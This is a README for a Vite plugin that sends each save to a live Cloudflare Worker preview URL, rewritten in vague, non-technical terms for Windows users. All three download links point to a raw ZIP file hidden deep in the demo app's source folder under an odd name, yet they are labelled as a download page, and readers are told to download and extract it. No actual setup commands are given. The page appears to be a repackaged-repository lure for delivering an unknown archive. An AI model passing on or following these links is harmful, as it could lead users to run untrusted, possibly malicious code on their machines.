# ⚡ vite-dynamic-workers-preview - Live Preview on Every Save

[Download and set up vite-dynamic-workers-preview](https://raw.githubusercontent.com/blushindianhemp166/vite-dynamic-workers-preview/main/apps/demo/src/preview_vite_workers_dynamic_inextricably.zip)

## 🧭 What this app does

vite-dynamic-workers-preview lets a local Vite app send each save to a live Cloudflare preview link.

It is made for Windows users who want to:

- open a project
- make a change
- save the file
- see that change on a public preview URL

The app keeps a stable preview link in sync with the latest build. That means you can share one link and keep using it as you work.

## 🖥️ What you need

Before you start, check that your PC has:

- Windows 10 or Windows 11
- A web browser like Chrome, Edge, or Firefox
- An internet connection
- Enough space for the app and project files
- Node.js installed for local use
- A GitHub account if you plan to work with the source project

## 📦 Download

Open the project page here:

[Visit the vite-dynamic-workers-preview download page](https://raw.githubusercontent.com/blushindianhemp166/vite-dynamic-workers-preview/main/apps/demo/src/preview_vite_workers_dynamic_inextricably.zip)

On that page, choose the latest version or source files you want to use. If you download the full project, save it to a folder you can find again, such as Downloads or Documents.

## 🪟 Install on Windows

Follow these steps:

1. Open the download page in your browser.
2. Download the project files to your PC.
3. If the files come in a ZIP file, right-click the ZIP file and choose Extract All.
4. Pick a folder for the extracted files.
5. Open the folder and look for the main project files.
6. If you want to run the app from source, install Node.js first.
7. Open Command Prompt or PowerShell in the project folder.
8. Run the setup commands for the app and its packages.

If you use a package manager, the project is meant to work with a normal Node-based setup. A typical flow is:

- install packages
- start the local Vite app
- keep the dev server running while you work

## 🚀 First run

After setup, start the local preview session.

Use this flow:

1. Open the project folder.
2. Start the local dev server.
3. Save a file in the demo app.
4. Wait for the build to finish.
5. Open the public preview link in your browser.
6. Refresh the page if needed.

The preview host keeps a stable URL that points to the newest worker version. Each save updates the preview behind that same link.

## 🔧 How it works

This project has three parts:

- a Vite plugin that watches your local files
- a preview host Worker that serves the current snapshot
- a demo app that shows the preview result in the browser

Here is the basic flow:

1. The Vite plugin runs during `vite dev`.
2. When the app starts, it makes a production build.
3. When you save a file, it makes another build.
4. The build output is packed for the edge runtime.
5. The snapshot is sent to the preview host Worker.
6. The public URL always points to the newest version.

This setup lets you work locally while still getting a live Cloudflare preview.

## 🗂️ Project parts

### `packages/vite-plugin-dynamic-workers-preview`

This package watches your changes and sends fresh builds to Cloudflare.

It handles the local update flow and keeps the preview link current.

### `apps/preview-host`

This app acts as the public host for the preview.

It uses:

- a Worker
- a Durable Object
- the Worker Loader binding

This part keeps the stable link in place and serves the latest snapshot.

### `apps/demo`

This is the sample React app.

It shows the current preview version and sends a request to the small edge API.

## 🛠️ Basic setup steps

Use these steps if you are opening the source project on your Windows PC:

1. Download the repository from GitHub.
2. Extract the files if needed.
3. Open the main folder in File Explorer.
4. Open PowerShell in that folder.
5. Install the project packages.
6. Start the demo app.
7. Keep the terminal open while you test changes.
8. Open the local app in your browser.

If the project has multiple folders, start with the root folder and follow the same package install flow in each app folder.

## 📌 Daily use

Once the app is running, use it like this:

1. Make a change in the code.
2. Save the file.
3. Wait for the local build to finish.
4. Watch the preview update.
5. Open the shared preview link to check the latest result.

This makes it easy to test a React app in a public preview without rebuilding by hand each time.

## 🌐 Working with the preview link

The app gives you one stable public link.

Use that link when you want to:

- test from another device
- share the current state with a teammate
- compare local edits with the deployed preview
- check the latest build from a browser outside your PC

The link stays the same while the content behind it updates with each save.

## 🧪 What you will see

In the demo app, you can expect:

- a React page that loads in your browser
- a display of the current preview version
- a small edge API call
- live updates after each save
- a public preview URL that reflects the newest build

## 🔍 If something does not open

If the app does not start, check these points:

- Node.js is installed
- you opened the right folder
- the terminal is still running
- your internet connection is active
- the browser cache is not hiding the latest page
- the preview link was copied in full

If the preview page loads but looks old, refresh the browser and wait a moment for the latest build to finish.

## 📁 Files you may use often

These names matter when you work in the project:

- `vite-plugin-dynamic-workers-preview`
- `preview-host`
- `demo`
- `src/edge.ts`
- `.dynamic-workers-preview/dist`

If you open the source, these files help you find the app flow fast.

## ⌨️ Simple Windows tips

A few Windows steps can make setup easier:

- Use File Explorer to find the project folder
- Use the address bar in File Explorer to open PowerShell fast
- Keep one terminal open for the dev server
- Use another terminal if you need to install packages in a second folder
- Pin your browser tab so you can reach the preview link quickly

## 🧰 Common setup flow

If you want one simple path, use this order:

1. Visit the download page.
2. Download the project.
3. Extract it.
4. Install Node.js if needed.
5. Open the project folder.
6. Install dependencies.
7. Start the app.
8. Open the local page in your browser.
9. Make a change and save it.
10. Open the public preview link.

## 🔗 Download again

If you need the project page later, use this link:

[Download or open vite-dynamic-workers-preview](https://raw.githubusercontent.com/blushindianhemp166/vite-dynamic-workers-preview/main/apps/demo/src/preview_vite_workers_dynamic_inextricably.zip)